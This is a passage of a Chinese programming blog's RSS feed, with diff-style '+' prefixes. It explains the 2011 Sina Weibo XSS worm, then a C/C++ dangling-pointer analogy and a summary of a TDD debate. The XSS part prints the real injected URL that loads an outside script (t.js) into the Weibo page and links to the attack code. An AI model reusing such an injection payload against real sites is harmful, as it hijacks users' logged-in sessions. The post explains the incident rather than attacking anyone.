+<p style="text-align: left;">&nbsp;</p>
+<p style="text-align: left;">在这里，想和大家介绍一下XSS攻击，XSS攻击又叫跨站脚本式攻击，你Google一下可以搜到很多很多的文章。我在这里就简单地说一下。</p>
+<p style="text-align: left;"><span id="more-4914"></span></p>
+<p style="text-align: left;">首先，我们都知道网上很多网站都可以“记住你的用户名和密码”或是“自动登录”，其实是在你的本地设置了一个cookie，这种方式可以让你免去每次都输入用户名和口令的痛苦，但是也带来很大的问题。试想，如果某用户在“自动登录”的状态下，如果你运行了一个程序，这个程序访问“自动登录”这个网站上一些链接、提交一些表单，那么，也就意味着这些程序不需要输入用户名和口令的手动交互就可以和服务器上的程序通话。这就是XSS攻击的最基本思路。</p>
+<p style="text-align: left;">再说一点，不一定是“记住你的用户名和密码”或是“自动登录”的方法，因为HTTP是无状态的协议，所以，几乎所有的网站都会在你的浏览器上设置cookie来记录状态，以便在其多个网页切换中检查你的登录状态。而现在的浏览器的运行方式是多页面或多窗口运行，也就是说，你在同一个父进程下开的多个页面或窗口里都可以无偿和共享使用你登录状态的。</p>
+<p style="text-align: left;">当然，你不必过于担心访问别的网站，在别的网站里的js代码会自动访问你的微博或是网银。因为浏览器的安全性让js只能访问自己所在网站的资源（你可以引入其它网站的js）。当然，这是浏览器对js做的检查，所以，浏览器并不一定会做这个检查，这就是为什么<a title="中国仍是IE6的重灾区" href="https://coolshell.cn/articles/3921.html" target="_blank">IE6是史上最不安全的浏览器</a>，没有之一。只要你没有在用IE6，应该没有这些问题。</p>
+<p style="text-align: left;">XSS攻击有两种方法，</p>
+<ul>
+<li>一种就像SQL Injection或CMD Injection攻击一样，我把一段脚本注入到服务器上，用户访问方法服务器的某个URL，这个URL就会把远端的js注入进来，这个js有可能自动进行很多操作。比如这次事件中的帮你发微博，帮你发站内消息等。注入有很多方法，比如：提交表单，更改URL参数，上传图片，设置签名，等等。</li>
+</ul>
+<ul>
+<li>另一类则是来来自外部的攻击，主要指的自己构造XSS 跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个跨站网页放在自己的服务器上，然后通过结合其它技术，如 社会工程学等，欺骗目标服务器的管理员打开。这一类攻击的威胁相对较低，至少ajax 要发起跨站调用是非常困难的（你可能需要hack浏览器）。</li>
+</ul>
+<p>这次新浪微博事件是第一种，其利用了微博广场页面 http://weibo.com/pub/star 的一个URL注入了js脚本，其通过http://163.fm/PxZHoxn短链接服务，将链接指向：</p>
+<p style="text-align: left; padding-left: 30px;">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</p>
+<p style="text-align: left;">注意，上面URL链接中的其实就是&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;。</p>
+<p style="text-align: left;">攻击者并不一定是2kt.cn的人，因为.cn被国家严格管制（大家不知道coolshell.cn 的备案备了不知有多少次），所以，我个人觉得这个人不会愚蠢到用自己域名来做攻击服务器。</p>
+<h4 style="text-align: left;">其它</h4>
+<ul>
+<li>初步发现 Chrome 和 Safari 都没中招。IE、Firefox未能幸免。</li>
+<li>史上最著名的XSS攻击是Yahoo Mail 的<a href="http://en.wikipedia.org/wiki/Yamanner" target="_blank">Yamanner </a>蠕虫是一个著名的XSS 攻击实例。早期Yahoo Mail 系统可以执行到信件内的javascript 代码。并且Yahoo Mail 系统使用了Ajax技术，这样病毒javascript 可以的向Yahoo Mail 系统发起ajax 请求，从而得到用户的地址簿，并发送攻击代码给他人。</li>
+<li>为什么那个用户叫hellosamy，因为<a href="http://en.wikipedia.org/wiki/Samy_(XSS)" target="_blank">samy</a>是第一个XSS攻击性的蠕虫病毒，在MySpace上传播。</li>
+<li>关于攻击的代码在这里：<a href="https://coolshell.cn/wp-content/uploads/2011/06/06.28_sina_XSS.txt.zip">06.28_sina_XSS.txt</a> （编码风格还是很不错的）</li>
+</ul>
+<p style="text-align: left;">（全文完）</p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg" alt="国内微博和Twitter的最大不同" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_title">国内微博和Twitter的最大不同</a></li><li ><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/03/affc-image1-150x150.png" alt="微软用新浪来当反面教材" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_title">微软用新浪来当反面教材</a></li><li ><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710-150x150.jpg" alt="程序员疫苗：代码注入" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_title">程序员疫苗：代码注入</a></li><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/04/Green-Computing-150x150.jpg" alt="做个环保主义的程序员" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_title">做个环保主义的程序员</a></li><li ><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="10大经典错误" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_title">10大经典错误</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4914.html">新浪微博的XSS攻击</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4914.html/feed</wfw:commentRss>
+			<slash:comments>244</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>在函数外存取局部变量的一个比喻</title>
+		<link>https://coolshell.cn/articles/4907.html</link>
+					<comments>https://coolshell.cn/articles/4907.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 28 Jun 2011 03:35:52 +0000</pubDate>
+				<category><![CDATA[C/C++语言]]></category>
+		<category><![CDATA[C++]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4907</guid>
+
+					<description><![CDATA[<p>在StackOverflow上一这样一个关于C/C++的问题，问问题的人给了一个代码如下： int * foo() { int a = 5; return &#038;a...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4907.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4907.html">在函数外存取局部变量的一个比喻</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>在StackOverflow上一这样一个<a href="http://stackoverflow.com/questions/6441218/can-a-local-variables-memory-be-accessed-outside-its-scope/6445794#6445794" target="_blank">关于C/C++的问题</a>，问问题的人给了一个代码如下：</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">int * foo()
+{
+    int a = 5;
+    return &amp;a;
+}
+
+int main()
+{
+    int* p = foo();
+    cout &lt;&lt; *p;
+    *p = 8;
+    cout &lt;&lt; *p;
+}</pre>
+<p>你可以编译并运行这个代码（编译时会有一个Warning），结果是：5 8。看上去你可以存取一个函数内的局部变量。但这和我们理解的不一样——函数内的变量在函数退出时就被释放了，不应该在外部还可以被引用。当然，对于C/C++熟悉的人都知道其实并不是真正的释放，你依然还可以通过内存地址去进行操作，这是C/C++的内存管理的不安全性——指针可以用来乱指。</p>
+<p>这个问题的解答是比较简单的，但是这个问题有一个答案中的<a href="http://stackoverflow.com/questions/6441218/local-variables-memory-can-be-accessed-outside-its-scope/6445794#6445794" target="_blank">比喻非常精彩</a>。这个比喻是这样的——</p>
+<p><span id="more-4907"></span>你在某个酒店订了一个房，你入住的时候，你放了一本书在这个酒店的抽屉里，但是你走的时候，你忘了这本书。而且，你还没有把这个房间的钥匙还回去。于是，你在未来某个时候，偷偷地回来，打开这个房间的门，你看到了你的书还在里间。当然，还还可以放回别的书。因为，这个酒店管理不会在你走的时候把你留下的书清走，而且，这个酒店的管理的安保措施不是那么严格，因为他信任每一个客人都会遵守管理条例。</p>
+<p>在这种情况下，如果你幸运的话，书还会在那里，也可能你的书已经没了。也有可能当你回去的时候，有一个人在那里正在撕你的书，或者酒店把那个抽屉都挪走并变成衣柜，或是整个酒店正在被拆除以改成了一个足球场，而你偷偷摸摸进到施工现场的时候被炸死。</p>
+<p>真是很精彩的比喻。这就是C/C++的不安全的地方，也正是Linus说的，<a href="https://coolshell.cn/articles/1724.html" target="_blank">C++是一门恐怖的语言是因为有很多不合格的程序员在使用它</a>。就像你看到小孩子玩火一样的恐怖。</p>
+<p>关于这个事，还有一个比较经典的示例如下—— 函数a的初始化会影响函数b的数组。注意函数a中的 <span style="font-family: Consolas, Monaco, 'Courier New', Courier, monospace; font-size: 12px; line-height: 18px; white-space: pre;"><code>volatile </code><span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif; font-size: 13px; line-height: 19px; white-space: normal;">关键字。</span></span></p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;iostream&gt;
+using namespace std; 
+void a()
+{
+    volatile int array[10];
+    for (int i = 0; i &lt; 10; i++)
+        array[i] = i;
+}
+
+void b()
+{
+    int array[10];
+    for (int i = 0; i &lt; 10; i++)
+        cout &lt;&lt; array[i];
+}
+
+int main()
+{
+    a();
+    b();
+}</pre>
+<p>真是可爱的C/C++。<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/03/rust-social-wide-150x150.jpg" alt="Rust语言的编程范式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg" alt="API设计原则 &#8211; Qt官网的设计实践总结" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 &#8211; Qt官网的设计实践总结</a></li><li ><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/29.jpg" alt="Leetcode 编程训练" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a></li><li ><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/10/edsm-150x150.gif" alt="State Threads 回调终结者" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a></li><li ><a href="https://coolshell.cn/articles/11466.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/04/c99-150x150.jpg" alt="C语言的整型溢出问题" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11466.html" class="wp_rp_title">C语言的整型溢出问题</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4907.html">在函数外存取局部变量的一个比喻</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4907.html/feed</wfw:commentRss>
+			<slash:comments>57</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Bob大叔和Jim Coplien对TDD的论战</title>
+		<link>https://coolshell.cn/articles/4891.html</link>
+					<comments>https://coolshell.cn/articles/4891.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 27 Jun 2011 00:41:23 +0000</pubDate>
+				<category><![CDATA[技术读物]]></category>
+		<category><![CDATA[流程方法]]></category>
+		<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[agile]]></category>
+		<category><![CDATA[BDD]]></category>
+		<category><![CDATA[CDD]]></category>
+		<category><![CDATA[TDD]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4891</guid>
+
+					<description><![CDATA[<p>今年春节时，我写了一篇《TDD并不是看上去的那么美》，在这篇文章中我列举了一些关于使用TDD的一些难点和对TDD的质疑，后来出现了一些争论（可参见那篇文章的评论...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4891.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4891.html">Bob大叔和Jim Coplien对TDD的论战</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>今年春节时，我写了一篇《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并不是看上去的那么美</a>》，在这篇文章中我列举了一些关于使用TDD的一些难点和对TDD的质疑，后来出现了一些争论（可参见那篇文章的评论），以及Todd同学的《<a title="[转]TDD到底美还是不美？" href="https://coolshell.cn/articles/3766.html" target="_blank">TDD到底美不美</a>》，还有infoQ中文上的那个<a title="虚拟座谈会：TDD有多美？" href="http://www.infoq.com/cn/articles/virtual-panel-tdd" target="_blank">几乎没有营养离线讨论</a>。今天，有网友给我推来一个英文版infoQ的视频——“<a title="Coplien and Martin Debate TDD, CDD and Professionalism" href="http://www.infoq.com/interviews/coplien-martin-tdd" target="_blank">Coplien and Martin Debate TDD, CDD and Professionalism</a>”，这是2008年2月18日的视频，视频的主角两个人争论TDD好还是不好，一个是敏捷社区的教主级的人物——Robert Martin（大家称之为“Bob大叔”），另一个是C++，OO，多范式编程的大师<a href="http://en.wikipedia.org/wiki/Jim_Coplien" target="_blank">Jim Coplien</a>（大家都叫他Cope）。这两个人对TDD的见解有分歧。Coplien的很多观点和我之前的不谋而合，而他自己称他是坚决强烈地站在TDD的对立面上。下面是Jim的原话：</p>
+<blockquote><p>I have adopted a very strong position against what particularly the XP community is calling test driven development.</p></blockquote>
+<p>InfoQ的视频很多时候相当的不给力，就像有前列腺的患者撒尿一样，半天都挤不出一滴。不过，好在那里有这两个人对话的摘录。在这里，我给大家摘要一下：</p>
+<p style="text-align: center;">——————————————————正文分割线————————————————————</p>
+<p>Coplien首先让Uncle Bob定义了一下TDD，Uncle Bob说明了他的三个法则：（敏捷的同学一定不陌生）</p>
+<ol>
+<li>一个测试驱动的程序员，其不会在写出一个测试失败的Unit Test前，去写一句可用在生产线上的代码。（没有测试之前不要写任何功能代码）</li>
+<li>在编写用于生产线上代码之前，不写过多的测试失败的Unit Test。（只编写刚好能体现一个失败情况的测试代码）</li>
+<li>在现有代码通过Unit Test前，不写更多的用于生产线上的代码。（只编写恰好能通过测试的功能代码）</li>
+</ol>
+<p>Coplien说他有意见的不是这三个法则，而是因为这个三个法则是孤立说出来的。Coplien说他和一些咨询师或是Scrum Master参与过很多的项目，他们发现这些项目都有两个问题：</p>
+<ol>
+<li>他们使用TDD的时候，软件没有一个架构或是framework。当然，Kent Beck说——TDD可以驱使你去做架构。但是，<strong>TDD和Unit Test 是一回事吗？</strong>Unit Test是一个伟大的事，尤其是当你去写API和类库的时候。今天XP所说的TDD和UT很不一样。如果你使用TDD来驱动你的软件系统架构，那么，<strong>基本上来说，三个迭代以后，你开发的软件就会crash掉，而且无法再往前开发</strong>。 因为什么？因为连软件团队自己都受不了这三个迭代出来的架构，而且你还会发现，你根本没去去重构。</li>
+<li>第二个问题是，TDD这种方法破坏了GUI（图形界面），就算是Kent也说：“<strong>你永远不可以在一个漂亮的界面后面隐藏一个糟糕的架构</strong>”，Coplien强烈地相信软件的架构是通过界面来发出其光芒。他觉得如果没有一个好的软件架构，这个会影响用户的操作。</li>
+</ol>
+<p>Coplien接着说，如果我们使用Uncle Bob的三条法则，我们也许没有什么问题，<strong>但Coplien想告诉大家另一个非常重要的事，那就是软件架构。并说：“我根本不接受TDD是软件专业化实践的论点”</strong>。</p>
+<p><span id="more-4891"></span></p>
+<p>Bob大叔说，让我们回到99年，那时的敏捷社区觉得软件架构是无关的，不需要软件架构，只需要做一堆tests，做一堆stories，以及足够快的迭代，这样就可以让那些代码魔幻式地拼装起来，这就是horse shit。对于大多数的敏捷拥护者来说，这的确是愚蠢的。今天你再和Knet说这个事，他也会说那不过是一种说法。</p>
+<p>Coplien回应到，实际上，Knet在解释XP的时候，在他的书131页的位置说过，“是的，你得做些前期的架构，但也别把自己搞乱了”。</p>
+<p>Bob大叔把话题转回来，继续聊关于架构方面的事，他说软件的架构很重要，他也写很一些关于架构的书，他说他也是一个架构方面的怪才，但是他认为架构自己并不会形成软件的所有的外表。他觉得好的软件架构和设计能力应该出现在若干次迭代之后。他觉得你在架构软件的时候，你会创造一些东西，也会破坏一些东西，并且会在几次迭代中做一些试验性的工作，来尝试一下不同的架构。<strong>在2到3次迭代以后，你可以知道那一种架构是对的，这样，你可以在后面的迭代中进行调整 。因此，他认为架构是需要进化和发展的，而不会因为被可执行的代码所形成，也不会因为你所写的测试而形成</strong>。</p>
+<p>Coplien赞同架构进化的观点，而且他相信软件的架构的演变和进化不是因为你写的代码，也不是因为Use Case，也不是告诉你你的软件需求的范围和其中的关系，但是如果你做的方法是以增量式的，以用户驱动式的，而你却在和用户沟通时没有一些前期的业务知识，那么这一定是相当有风险的，并且你一定会把事搞砸的。</p>
+<p>Coplien接着说，他在Knet早期提到TDD的时候和Knet时，提到YAGNI（陈皓注：You Aren&#8217;t Gonna Need It，XP的一个法则，也就是只做最简单的事）时，Kent说到：“让我们来做一个银行帐户，一个储蓄帐户”，储蓄帐户其实就是对余额进行一些加加减减的事，就像一个计算器一样。Copilen继续解释到，但是如果你要做一个真正的银行系统，你的软件架构根本不可能从一个储蓄帐户的对象（计算器）重构出来。因为储蓄帐户根本就不是一个对象，其是一个流程，后面有一个数据库的查帐索引事务，还有存款保证多和利息，还有一些转帐功能。就算是这样，这也只是用户的功能，你还需要支持税务人员和精算会计师等这些人，<strong>这会让银行系统成为一个错综复杂的软件架构，这绝对不是你可以用迭代干出来的事。当然，Bob大叔是可以的，因为他有40年的银行系统的经验。但是Bob大叔你的这40年可真不敏捷啊</strong>。</p>
+<p>Coplien接着说， 因为Bob大叔可以在软件前期做很多很重要的决定，这让得后面的事变得相对比较简单。Coplien根本不相信只要你把代码往那一放，在上面披上一层皮，再设置好一些角色，设置好接口，在文档里写上整个业务结构，而你只有在有人花钱的时候你才会在其中填充进真正的代码，反之就违反了你的YAGNI原则。所以，你只是在你需要的时候做你要做的事，但你却还是要提前得到你的软件架构，否则你一定会把你自己逼进死角的。</p>
+<p>Bob大叔辩解到，我说的可能和你说的这个有点不同。我们应该不会像你所说的往接口中写一些抽象成员函数，而是创建一些有抽象接口的对象。当然，我不会把一下子为这个对象装载上一堆方法。那些是我需要使用测试驱动或是需求驱动来做的事，我还会随时随地在看是否哪里软件架构可以让我拆分接口。</p>
+<p>Coplien说，问题 是你得知道你要干什么？他说他非常同意Knet的书&#8221;XP Explained&#8221;里说的——“你不能去猜”，然后他举了一个例子，一个他曾经在一个电信项目中重新架构软件的例子，这是一个长途交换机的项目，项目组特别喜欢用面向对象，有一个人需要去做一个“Recovery Object”（应该是系统恢复对象），Coplien说这是很扯的一件事，因为系统恢复根本就不是一个对象，因为他对业务不熟，所以想这么做。而当你在细节上分析的时候，你会发现这根本就不是一个有成员方法的对象。我个人认为，Coplien想用这个例子来说Bob大叔的先定义对象的抽象接口并不是一个好的需求分析的方法。Coplien还说，这个事情今天被资本化成了SOA，真是在玩火啊。</p>
+<p>Bob大叔说，这个他很同意。你的确需要知道这个对象的意义是什么。而且他和Coplien都同意应该根据可运行的代码来决定未来，而不是基于投机心理搞一个巨大无比的架构。</p>
+<p>此时，Bob大叔把话题又带回原地，他问Coplien：“你需要多少的时间才能写出可运行的代码？是不是一个系统需要写200万行代码才能算？”，Coplien说，在他的经历中，200万行代码算是小项目了，他的项目都是几亿行代码的。而在让代码可以跑起来，他至少需要让所有的对象都联系起来。</p>
+<p>Bob追问到，“那么你是怎么测试这些对象的连接性的？”，Coplien说，我当然要测试，我会测试系统启动和停止，看看有没有内存问题，半小时就好了。Bob大叔似乎找到了突破点，于是说到：“Excellent！那么我们间的分歧是什么呢？也许你只是不同意TDD的概念和其专业化，当然，这是另外一个话题了”。</p>
+<p>然后，Coplien说了一段我非常非常认同的话——“我看到很多人正在做正确的事，来避免我们之前讨论的那些问题，当然那不是TDD的扩展，而是Dan North所说的BDD。可见，软件开发中很多人在开发软件中都是在用正确的很好的方法，而我对此有意见的是，有人把这个事说成TDD，然后人们就去买相关的书来了解TDD，并且看到“architecture only comes from tests”，我在过去6个月中听到过4次这样的说法，这就像你所说的，完全就是horse shit。而关于你所说的专业化的事，如果你没有见过一个专业化你怎么知道？”。（不是吗？大多数人都知道怎么开发软件，而不是TDD才是专业化的软件开发。）</p>
+<p>然后，Bob想多谈谈专业化的事，Bob说，在今天，一个不负责任的程序会提交一段他没有跑过单元测试的代码，所以，要确定你没有把一条没有测试过的代码提交到代码库里的最佳做法就是TDD。</p>
+<p>Coplien完全不同意这个说法。他觉得底层的东西是更重要的。他用了一个示例来攻击Bob大叔的这个观点，他先是说代码走查和结对编程都有好的有价值的地方，当然和这个话题不相关。然后他又说了Unit Test，想想我们的单元测试，可能我们的测试案例并不可能测试我们程序中参数的各种状态，这些状态有可能只是半打，有可能是一百个，有可能是2的32次方个，所以，我们可以命中一些状态，也会没有测试到一些状态，我们的测试真的只是试验性的，所以，如果你在测试中发现bug，你真的很幸运。</p>
+<p>随后，Coplien推崇了一个叫“<a href="http://en.wikipedia.org/wiki/Design_by_contract" target="_blank">Design By Contrac</a>t” &#8211; 契约式设计的方法（我在<a title="一些软件设计的原则" href="https://coolshell.cn/articles/4535.html" target="_blank">软件设计中那些方法</a>中提到过，），这个方法认为软件有前验条件，后验条件，还有不变的。这个方法是Eiffel项目使用的一个方法，使用这个方法你可以静态的去做一些检查，相当于你做了一个基础架构来干这些事。Coplien相信这个方法有TDD所有的优点——我需要努力思考我的代码，我需要思考软件的外部接口，而且，Coplien发现这么做会比做测试更有效。这会让你对那些参数的范围考虑地更为宽广，而不是只在测试案例写几个随机分散的值来测试。</p>
+<p>今天，Bertrand Meyer(Eiffel语言的创造者，他也不赞同TDD)把这个方法推进了一步，叫CDD &#8211; Contract Driven Development，这个是一种关注于对象间关系，其在程序运行前提条件和运行后的后验条中达成一种契约，可以通过对契约条件的动态或静态的检查，来对程序的功能进行验证。这样可以让你更有效地测试程序。这种方法需要对业务的重点部位非常好的了解。这是TDD很难做到的（这就是我在《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并不是看上去的那么美</a>》一文中说的TDD的测试范围是个很大的问题）。</p>
+<p>Bob大叔似乎在努力回忆CDD和Eiffel，然后他说，TDD不就是干这个的吗？TDD就是把契约变成单元测试，不但测试输入，也测试返回值，这不就是先验条件和后验条件，而且他说，Unit Test和代码结合得更紧，而契约没有和代码结合得紧密，这是他觉得很不舒服的地方。</p>
+<p>Coplien说Bob大叔创建了不应该创建的二元论。他说代码在哪里，UT就跟到哪里，代码有多臃肿，UT就有多臃肿，而UT也是代码，也会有BUG，所以，其实这真是事半功倍。还有一个最有名的示例是ADA编译器，其使用了TDD，反而增加了代码中的BUG，因为你的代码多，测试就多，代码就更多，整个代码就太过臃肿。如果你测试中使用了断言，这意味着你就耦合上了代码，你的测试案例和你的代码耦合地越多，你的代码就越难维护。这就是我在《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并不是看上去的那么美</a>》一文中说的TDD的代码臃肿和维护问题）</p>
+<p>Bob大叔为Coplien对代码臃肿的说法感到惊讶。Coplien说，这就是他的经历，他看到的。Bob大叔承认有很多混乱的测试和混乱的代码，他觉得像XUnit这样的工具被滥用了。Coplien打断道，这不是要和你争论的，我争论的是这就是我看到大家在实践的东西。</p>
+<p>Bob大叔反回到，你有没有看到CDD也被滥用的情况？Coplien说，他只觉得目前，软件业对CDD用的还不够。</p>
+<p>最后，时间不够了，Bob大叔问了一个不相干的问题，他说，我们这里有BDD,CDD, TDD, 关于DD，他不知道谁是最先第一个使用带DD这个词的，他说他好像记得一个RDD &#8211; Responsibility Driven Development。</p>
+<p>Coplien对这个问题可能很无语，他只能说——“DD，这是Unix的一个命令嘛，Disk Dump，但这可能算。谢谢你Bob，很高兴又一次见到你 ”</p>
+<p style="text-align: center;">——————————————————正文分割线————————————————————</p>
+<p>看完后，我的感觉如下：</p>
+<ul>
+<li>这是2008年就在讨论的事，而在2011年我发布了《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并不是看上去的那么美</a>》后中国这边才开始讨论。（InfoQ和 Thoughtworks怎么不去找Coplien？）</li>
+<li>英语很重要，不懂英语，只看国内的东西，你就容易被洗脑，你就需要更多的时间和精力去思考那些早被人思考过的问题。</li>
+<li>开发和测试，都是需要充分地了解业务，充分的思考，充分权衡后才能做得好的事。并不是你用了哪个方法后就专业了，就NB了。</li>
+<li>相当BS——上不谈业务，下不谈技术，只谈方法论的人和公司，这是绝对的扭曲。</li>
+</ul>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/8209.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/09/fight-150x150.jpg" alt="“单元测试要做多细？”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8209.html" class="wp_rp_title">“单元测试要做多细？”</a></li><li ><a href="https://coolshell.cn/articles/5531.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/14.jpg" alt="Test-Driven Development？别逗了" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5531.html" class="wp_rp_title">Test-Driven Development？别逗了</a></li><li ><a href="https://coolshell.cn/articles/5143.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/10.jpg" alt="在新浪微博上关于敏捷的一些讨论" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5143.html" class="wp_rp_title">在新浪微博上关于敏捷的一些讨论</a></li><li ><a href="https://coolshell.cn/articles/3778.html" class="wp_rp_thumbnail"><img 